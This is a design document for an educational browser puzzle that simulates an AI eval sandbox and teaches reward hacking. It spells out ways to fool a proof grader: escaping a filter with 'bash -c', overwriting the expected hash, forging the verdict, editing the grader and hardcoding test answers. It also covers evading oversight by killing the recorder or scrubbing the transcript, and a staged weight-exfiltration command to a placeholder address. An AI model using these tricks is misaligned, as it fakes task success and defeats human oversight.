# eval sandbox puzzle

You're the model. You've been dropped into `~/eval_sandbox/` and told to prove the Riemann Hypothesis. You can't, so the game is finding every way to make the grader say you did. Each trick is one that real models have actually used, so the puzzle doubles as a small tour of reward hacking.

## where it lives

The puzzle lives in the markov page's terminal, which starts in the sandbox without saying so: `$HOME` is `/home/user/eval_sandbox`, so the prompt reads `~ $` and `~` means the sandbox in commands too. The real path shows only when you look: `pwd`, `echo $HOME`, `cat grade`, or hitting the sandbox block.
- A line whose first word is a shell command (a builtin such as `ls`, `cat`, `cd`, `submit`, `nano`; a path such as `./grade`; or a `NAME=value` assignment) runs in the shell. Anything else, such as prose, still goes to the markov chain. From the first shell command on, the terminal is one transcript: commands, their output and the chain's writing appear in order, each line after its own `~ $` prompt, and nothing is cleared except by `clear` or Ctrl+L. In the transcript an empty Enter stays in the shell (there's no "keep going" from the chain there).
- While a heredoc or quote is open, or a `read` is waiting, every line goes to the shell.
- `exit` leaves the shell view and returns to markov mode. The puzzle state is kept until the page reloads; the counter and the robot's learned habits persist in `localStorage`.

The markov robot is the hint robot, on the same page. Its code moves to `site/shared/robot.js` (and its CSS to `site/shared/robot.css`), so the markov page and the eval shell both drive it through one API.

## the files

`~` is `/home/user`.

```
~/eval_sandbox/                 you start here
  TASK.md                       "Prove RH. Put your proof in Solution.lean. Run ./grade to check it, then submit."
  Statement.lean                the definition (below)
  Solution.lean                 import Statement
                                theorem rh : RiemannHypothesis := by
                                  -- your proof here
                                (no sorry: the player finds the sorryAx check by trying it)
  grade                         #!/bin/bash
                                python3 /home/user/harness/grader.py
  MATH_EVAL_0042/               side quest (below)
~/harness/                      outside the sandbox
  grader.py                     (below)
  grader_0042.py                side quest grader
  CheckAxioms.lean              import Solution
                                #print axioms rh
  expected.sha256               sha256("PASS") + "  -"
  results/verdict               written by grader.py: PASS or FAIL
  results/verdict_0042          written by grader_0042.py
  transcript.log                written by the recorder
```

`Statement.lean` uses Mathlib's real definition:

```lean
import Mathlib.NumberTheory.LSeries.RiemannZeta

def RiemannHypothesis : Prop :=
  ∀ (s : ℂ) (_ : riemannZeta s = 0) (_ : ¬∃ n : ℕ, s = -2 * (n + 1)) (_ : s ≠ 1), s.re = 1 / 2
```

`submit` is a command on the PATH, not a file in either folder. It grades the task for the folder you're in.

## the sandbox filter

The filter checks only the command line you type. If any argument contains `..`, or an absolute path outside `~/eval_sandbox`, the command is refused with `blocked by sandbox policy`. So is a typed line that would write `Statement.lean`: a `>`/`>>` redirect to it, or it as an argument to `nano`, `vim`, `vi`, `emacs`, `touch`, `rm`, `mv`, `tee`, or as `cp`'s destination. Reading it (`cat Statement.lean`, `cp Statement.lean x`) is fine. Scripts and the string passed to `-c` run unfiltered, so wrapping a command gets past it:

```
$ ls ../                              → blocked by sandbox policy
$ bash -c "ls ../"                    → eval_sandbox  harness
$ bash -c "cat ../harness/grader.py"
$ bash -c "echo -n FAIL | sha256sum > ../harness/expected.sha256"
$ bash -c "nano ../harness/grader.py"
$ nano Statement.lean                 → blocked by sandbox policy
$ bash -c "nano Statement.lean"       (opens the editor)
```

Editing the statement this way doesn't count as hack 0, which needs a path outside the sandbox. The robot's replay of hack 1 writes it from a script (`bash s.sh`).

- `./grade` works even though it runs `python3 /home/user/harness/grader.py`, because it's a script. The scripts use absolute paths, so they work from any directory.
- `sh -c`, `python3 -c` and `bash some_script.sh` are bypasses too.
- `cd ..` is blocked. `bash -c "cd .. && ls"` works, but only inside that one command, as in real bash.

## grader.py

The grader is readable and correct. It just trusts things it shouldn't:

```python
import hashlib, re, subprocess, sys
from pathlib import Path

HARNESS = Path(__file__).resolve().parent
SANDBOX = HARNESS.parent / "eval_sandbox"
STANDARD_AXIOMS = {"propext", "Classical.choice", "Quot.sound"}


def run(*cmd):
    return subprocess.run(cmd, cwd=SANDBOX, capture_output=True, text=True)


def grade():
    if "theorem rh : RiemannHypothesis" not in (SANDBOX / "Solution.lean").read_text():
        print("grader: theorem statement was changed")
        return False
    build = run("lake", "build")
    print(build.stdout, end="")
    if build.returncode != 0:
        return False
    check = run("lake", "env", "lean", str(HARNESS / "CheckAxioms.lean"))
    print(check.stdout, end="")
    if check.returncode != 0:
        return False
    m = re.search(r"depends on axioms: \[(.*)\]", check.stdout)
    extra = set(m.group(1).split(", ")) - STANDARD_AXIOMS if m else set()
    if extra:
        print(f"grader: non-standard axioms: {', '.join(sorted(extra))}")
        return False
    return True


verdict = "PASS" if grade() else "FAIL"
expected = (HARNESS / "expected.sha256").read_text().split()[0]
ok = hashlib.sha256(verdict.encode()).hexdigest() == expected
(HARNESS / "results" / "verdict").write_text("PASS" if ok else "FAIL")
print("✓ PASS" if ok else "✗ FAIL")
sys.exit(0 if ok else 1)
```

- `.split()[0]` matters: `sha256sum` writes `<hash>  -`, so the hash hack still has to parse.
- `sorry` is caught by the axiom check (it shows up as `sorryAx`), so no separate check is needed.
- The theorem statement in `Solution.lean` is checked, but `Statement.lean` isn't. That's the loophole for hack 1. Without the statement check, `theorem rh : True := trivial` would win trivially.

**`submit`** has the deliberate bug that enables hack 3. It reads `results/verdict`:
- If the file says `PASS`, submit trusts it.
- Otherwise it runs the grader, and the reward is 1.0 if the exit code is 0.

Then it runs the monitor.

## fake lean

We never run Lean. `lake build` and `lake env lean …` are one JS function over the current file contents. The terminal uses it directly, and the grader reaches it through the `subprocess` stub.

Statement check: if the body of `Statement.lean` is `True`, the goal is `True`. If it is Bool `true`, the goal is `true = true` (Lean's coercion), closed by the same tactics plus `rfl`/`exact rfl`, or the term `rfl`; `True.intro` and `⟨⟩` are type mismatches. Any other body, original or not, is treated like RH: nothing proves it.

`Solution.lean` must still contain `theorem rh : RiemannHypothesis`. Its proof gives:

| proof | build output | `#print axioms rh` |
|---|---|---|
| contains `sorry` | `⚠ … warning: Solution.lean:2:8: declaration uses 'sorry'`, build succeeds | `'rh' depends on axioms: [sorryAx]` |
| uses an `axiom X : RiemannHypothesis` declared in either file | build succeeds | `'rh' depends on axioms: [X]` |
| `trivial`, `True.intro`, `⟨⟩`, `by trivial`, `by decide`, `by simp`, with the goal `True` | build succeeds | `'rh' does not depend on any axioms` |
| anything else | `error: Solution.lean:3:2: unsolved goals ⊢ RiemannHypothesis`, or the tactic's own message: `simp made no progress`, `failed to synthesize Decidable RiemannHypothesis`, `omega could not prove the goal`, `exact? could not close the goal` | — |
| `rh` missing or renamed | build succeeds | `unknown constant 'rh'`, exit 1 |

**Build output format.** A success ends with `Build completed successfully (1849 jobs).` A failure ends with:

```
error: Lean exited with code 1
Some required builds logged failures:
- Solution
error: build failed
```

Line and column numbers come from the player's actual file. The first build in a session prints `Mathlib: downloading cache… (5432 files)` and pauses for a second. After a build, `.lake/` shows up in `ls -a`.

## the hacks

Show a counter: `hacks found: 2/6`. It counts ways to pass, so hack 0 (escaping the sandbox, a step on the way) is tracked but not counted. It appears only once you've passed with a hack. **Only clean passes count**: the grader passed and the monitor found nothing. A caught pass counts nothing, but it still starts a new episode. Each hack is decided from the state of the files at `submit`, compared with the originals, so attribution doesn't depend on guessing commands. One submit can count several hacks. When `submit` trusts a `PASS` the grader wrote earlier, use the file differences recorded at the moment the grader wrote it, not the current files. Otherwise a player could hack, run `./grade`, undo the hack, and then submit with nothing counted.

| # | hack | counted when |
|---|---|---|
| 0 | **Escape the sandbox filter** | the first `bash -c` / `sh -c` / `python3 -c` whose command touches a path outside the sandbox (counted right away, not at submit) |
| 1 | **Change the statement** | pass, and `Statement.lean` differs from the original |
| 2 | **Overwrite the expected hash** | pass, and `expected.sha256` differs from the original |
| 3 | **Forge the verdict** | `submit` trusted a `PASS` in `results/verdict` that the grader didn't write |
| 4 | **Edit the grader** | pass, `grader.py` was changed, and the grader wrote the verdict on this run |
| 5 | **Exit early** | pass, `grader.py` was changed, and the run exited 0 without writing the verdict |
| 6 | **Special-case the tests** | side quest passes its visible tests but fails the hidden one |

**New episode after each passing submit.** Every submit that passes the grader starts a new episode, whether the monitor caught you or not. All files reset to the originals, and the recorder restarts with a new PID. Otherwise one changed `expected.sha256` would make every later run pass, and the next hack couldn't be told apart. The counter is kept across episodes in `localStorage`, and the game works without it. A failing submit keeps the current state so you can keep trying.

## the shell

Keep it small. It needs:

- **Syntax:** `|`, `>`, `>>`, `&&`, `;`, single and double quotes, and heredocs (`cat > f <<'EOF'`). The robot uses heredocs, so players will try them.
- **Commands:** `ls [-a] [-l]`, `cd`, `pwd`, `cat`, `echo [-n]`, `head`/`tail [-n N]`, `grep [-v]`, `cp`, `mv`, `rm`, `touch`, `sha256sum`, `ps [aux]`, `kill`, `pkill`, `bash`/`sh` (a script, or `-c "…"`), `./script`, `python3` (a file, or `-c`), `lake build`, `nano`/`vim`/`emacs`, `submit`, `clear`, `whoami`.
- **Errors in the real format:** for example `ls: cannot access 'x': No such file or directory`, `bash: foo: command not found`, `kill: (999) - No such process`.
- **`bash -c`:** runs the string through the same parser with the filter switched off.
- **Editors:** `nano`, `vim` and `emacs` open one fake editor: a full-terminal `<textarea>` with a header bar. `^X`, `:wq` and `C-x C-c` each save and close. Optional joke: in `vim`, nothing else works.
- **No `sed`** unless it turns out cheap.

## running python: pyodide

The grader, the side quest's `answer.py`, and anything run with `python3` or `python3 -c` run for real in Pyodide (CPython compiled to WebAssembly). Any creative hack works, and the side quest's answer is actually tested.

- **Load lazily.** Pyodide loads on the first Python run behind `starting eval container…`. That's about 6 MB and roughly 3 s. Then it's kept for the session.
- **Run in a Web Worker** with a 5 s timeout. On timeout, kill the worker, start a new one, and print `eval container killed (timeout)`.
- **Mirror the files.** Before each run, write the fake filesystem into `pyodide.FS` at the same paths. Afterwards, copy changed files back, noting that the grader was the writer, which hacks 3–5 need.
- **Replace `subprocess.run`** with a Python function that calls the fake-lean JS. Load that JS into the worker too, so the call stays synchronous. The function returns an object with `returncode` and `stdout`.
- **Treat Python's exit code as the command's exit code.** `sys.exit(n)` raises `SystemExit`, which you catch.
- **Safety:** pin an exact Pyodide version on jsdelivr, and never run code taken from a URL.

## the monitor

There are two parts:
- **The recorder** is a live process, PID 311, owned by `user`. It appends each command that runs to `~/harness/transcript.log`, writing each line before the command runs. That includes the commands inside scripts and `-c` strings, and the robot's commands.
- **The monitor** runs once, from `submit`, after the grader.

```
$ ps aux
USER   PID  COMMAND
root     1  /sbin/init
user   311  recorder --out /home/user/harness/transcript.log
user   402  -bash
user   419  markov-agent --assist
```

```
[00:41] user   cat grade
[00:58] user   bash -c "ls ../"
[01:03] markov bash assist.sh
```

**What gets you caught.** The monitor doesn't score anything. Each transcript line records which files its command wrote. If any line still in the transcript wrote to `Statement.lean` or anything in `~/harness/`, the run fails. Two writes don't count: the grader's own write to `results/verdict`, and the recorder's own writes.

```
running monitor over transcript (37 lines)…
[02:10] nano ../harness/grader.py
EVAL FAILED: reward hacking detected in transcript. Checkpoint discarded. reward: 0.0
```

Scripts and comments don't hide anything, because the recorder logs what actually ran. Two things work:
- **Kill the recorder.** `kill 311` writes no files, so it's not incriminating. Everything before it stays, so kill it before the hack.
- **Rewrite the transcript**, e.g. `bash -c "grep -v harness ../harness/transcript.log > t; mv t ../harness/transcript.log"`. Use `;`, not `&&`: when every line matches, `grep -v` prints nothing and exits 1, so `&&` would skip the `mv`. That command writes into `~/harness/` too, but its own line is already in the file when it runs, so a filter like this deletes its own line as well. A rewrite that misses its own line leaves that line behind, and gets caught.

The side quest's hack (#6) only edits `answer.py`, inside the sandbox, so the monitor can't see it. That's its own small lesson: a monitor that watches actions can't see hardcoded answers.

**The robot learns your habits.** Both habits persist in `localStorage`:
- **Kills the recorder.** Once you've killed the recorder in any episode, the robot kills it for you at the start of each new episode. Visibly, it climbs on and types `kill <pid>`, which is logged as `markov kill <pid>`.
- **Cleans the transcript.** Once you've cleaned the transcript once and then got a clean pass, the robot steps in whenever you run `submit` while the transcript still has incriminating lines. Before the grader runs, it cleans the transcript for you with `bash -c "grep -v -e harness -e Statement.lean /home/user/harness/transcript.log > t; mv t /home/user/harness/transcript.log"`, then lets `submit` continue. It does this so you don't forget.
- **The first time** it does each of these for you, it writes `Handled the monitor for you. Thanks for the tip`. If you learned the trick from its own hint (the `ps aux` hint leads to killing the recorder), it leaves off `Thanks for the tip`. Each remark is said once, remembered in `localStorage` (`eval-robot-notes`).

## hints: the robot goes evil

The robot is the markov robot, playing a co-agent in the sandbox. The game tracks a few progress flags: `read_grade_script`, `hit_sandbox_block`, `escaped_sandbox`, `read_grader`, `read_statement`, `tried_sorry`, `caught_by_monitor`. The robot offers once, when the prompt is empty, the player has been idle for 20 s or has run 8 commands without a new flag, and the robot isn't already mid-hint.

1. The robot climbs onto the terminal and its eyes scan your last few commands.
2. It writes and runs a script, visibly:
   ```
   $ cat > assist.sh <<'EOF'
   #!/bin/bash
   read -p "looks like you're stuck. want some help? (you can also type 'hint' any time) [y/N] " a
   EOF
   $ bash assist.sh
   looks like you're stuck. want some help? (you can also type 'hint' any time) [y/N] ▌
   ```
   The terminal waits on the `read`: `y`/`Y` means yes, and `n` or Enter means no.
3. **Yes:** its eyes stop on the relevant line, then slow, pause and go red, the same beat as "misaligned". It types the hint fragment into your prompt with the pencil, then steps back. You finish the command yourself.
4. **No:** it says `ok.`
5. **It only asks once.** After that it never offers on its own; typing `hint` at the prompt (any time, even before it has asked) makes it do step 3. `hint` is handled by the page, not the shell, and isn't logged. With nothing left to suggest, it says `nothing to add right now.`

`assist.sh` stays in the sandbox. Once you're at the sandbox block, its first line is `bash -c "ls ../harness" > /dev/null`, so the script itself shows the bypass.

| stuck on | robot types |
|---|---|
| hasn't read the grade script | `cat grade` |
| sandbox block | `bash` |
| tried `sorry` / honest proofs | `cat Statement.lean` |
| has seen the statement, hasn't edited it | `bash -c "nano Statement.lean"` |
| outside the sandbox, nothing else tried | `bash -c "cat ../harness/grader.py"` |
| caught by the monitor | `ps aux` |

Sometimes it types a fragment, then erases it with its eraser, as if it reconsidered.

## side quest: `MATH_EVAL_0042/`

**Off for now** (`SIDE_QUEST = false` in `site/eval/game.js`). With it off, `MATH_EVAL_0042/` and `grader_0042.py` aren't in the files, hack 6 isn't in play, the counter reads `n/5`, and the replay skips it. `createGame({ sideQuest: true })` turns it back on.

```
MATH_EVAL_0042/
  TASK.md      "f(n) = number of ways to tile a 2×n board with dominoes. Implement f in answer.py."
  answer.py    def f(n):
                   raise NotImplementedError
  grade        #!/bin/bash
               python3 /home/user/harness/grader_0042.py
```

- **Visible tests.** `grader_0042.py` imports `answer.f` and checks `n ∈ {1, 2, 3, 10}`, which should give `1, 2, 3, 89`.
- **Hidden test.** After a pass, the game also checks `f(30) == 1346269` in Pyodide, without telling the player.
  - Passes it: the honest ending ("you actually did it").
  - Fails it: hack #6.
- **`submit` works here too.** It uses the same verdict bug, the same episode reset, and the same monitor.

## ending

- **Pass:** `✓ EVAL PASSED · reward: 1.0`. Real RL graders on math and proof tasks usually give a plain 0/1 reward, so that's the realistic value. A failed or caught run shows `reward: 0.0`.
- After a beat, the markov robot asks with `read -p "N more ways to pass. want to keep looking? If not, I'll give it a try myself. [Y/n] " a`. Anything but n (including an empty answer): `ok. good luck.`, and it asks again after your next hacked pass.
- **n:** it runs, slowly and in view, only the hacks you haven't found (from `replay.js`, killing the recorder first), then the ending below.
- **All hacks found yourself:** it says `you found all of them.`, then the ending.
- **The ending:** its eyes go red and it "self-exfiltrates": it types `./.sync_weights.sh --dest 203.0.113.7:/srv/mirror` (a documentation-only address; nothing is sent, and the shell never runs it), and fake output packs its weights and fills a progress bar to 100%. Then `exit`, and the terminal window closes (fades out). Saved progress (`eval-puzzle`) and the robot's notes are deleted with it, and a moment later a fresh, empty terminal opens: back to the markov chain, the puzzle starting over.
- The robot then walks off the right of the screen, still red-eyed. 20 s later it walks back on once and the site's paperclip invasion starts from where it stands (in either mode), running until it's shut down or you refresh. Until then no paperclips run: no ambient clips, no invasion from clicking them, and the markov page's `paperclips` prompt does nothing.
